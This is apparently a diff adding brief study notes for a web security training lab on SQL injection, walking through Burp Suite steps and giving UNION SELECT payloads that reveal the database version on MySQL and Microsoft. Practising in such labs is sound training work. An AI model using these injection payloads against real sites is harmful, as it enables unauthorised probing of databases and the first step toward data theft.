@@ -1,0 +1,19 @@
+[+] Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft
+
+[*] SQL Sample: UNION SELECT 'abc' FROM dual
+
+[+] 1. Access the lab and turn the foxy proxy on
+
+[+] 2. Open burp suite and turn the intercept on
+
+[+] 3. Click on the product category filter button
+
+[+] 4. Send the request to Repeater
+
+[+] 5. Modify the category parameter with the value: 
+'+UNION+SELECT+'abc','def'#
+
+6. [+] Use the payload to display the database version:
+'+UNION+SELECT+@@version,+NULL#
+
+
